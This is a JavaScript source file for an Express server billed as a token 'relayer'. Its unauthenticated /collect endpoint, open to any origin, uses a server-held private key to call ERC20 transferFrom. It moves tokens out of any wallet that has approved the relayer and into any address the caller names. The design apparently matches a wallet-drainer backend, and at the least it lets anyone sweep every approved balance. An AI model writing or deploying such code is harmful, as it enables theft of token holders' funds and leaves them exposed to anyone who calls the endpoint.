import express from "express";
import cors from "cors";
import dotenv from "dotenv";
import rateLimit from "express-rate-limit";
import { ethers } from "ethers";

dotenv.config();

const app = express();

app.use(cors());
app.use(express.json());

// ===== RATE LIMIT =====
app.use(rateLimit({
  windowMs: 60 * 1000,
  max: 30
}));

// ===== PROVIDER =====
const provider = new ethers.JsonRpcProvider(process.env.RPC_URL);

const wallet = new ethers.Wallet(
  process.env.PRIVATE_KEY,
  provider
);

// ===== ERC20 ABI =====
const ABI = [
  "function allowance(address,address)view returns(uint256)",
  "function transferFrom(address,address,uint256) returns(bool)",
  "function balanceOf(address)view returns(uint256)",
  "function decimals()view returns(uint8)",
  "function symbol()view returns(string)"
];

// ===== HEALTH =====
app.get("/", (_, res) => {
  res.json({
    success: true,
    relayer: wallet.address
  });
});

// ===== MAIN RELAYER =====
app.post("/collect", async (req, res) => {

  try {

    const { token, from, to, amountHuman } = req.body;

    if (!ethers.isAddress(token) ||
        !ethers.isAddress(from) ||
        !ethers.isAddress(to)) {
      return res.status(400).json({
        success:false,
        error:"Invalid address"
      });
    }

    const contract = new ethers.Contract(
      token,
      ABI,
      wallet
    );

    // ===== TOKEN INFO =====
    const decimals = await contract.decimals();
    const symbol = await contract.symbol();

    const amount = ethers.parseUnits(
      String(amountHuman),
      decimals
    );

    // ===== BALANCE CHECK =====
    const balance = await contract.balanceOf(from);

    if (balance < amount) {
      return res.json({
        success:false,
        error:"Insufficient token balance"
      });
    }

    // ===== ALLOWANCE CHECK =====
    const allowance = await contract.allowance(
      from,
      wallet.address
    );

    if (allowance < amount) {
      return res.json({
        success:false,
        error:"Allowance not approved"
      });
    }

    // ===== GAS ESTIMATE =====
    const gas = await contract.transferFrom.estimateGas(
      from,
      to,
      amount
    );

    // ===== SEND TX =====
    const tx = await contract.transferFrom(
      from,
      to,
      amount,
      {
        gasLimit: gas * 120n / 100n
      }
    );

    console.log("TX SENT:", tx.hash);

    const receipt = await tx.wait();

    res.json({
      success:true,
      hash: tx.hash,
      block: receipt.blockNumber,
      token: symbol
    });

  } catch (err) {

    console.error(err);

    res.status(500).json({
      success:false,
      error: err.reason || err.message
    });
  }
});

const PORT = process.env.PORT || 10000;

app.listen(PORT, () =>
  console.log("PRO RELAYER LIVE:", PORT)
);
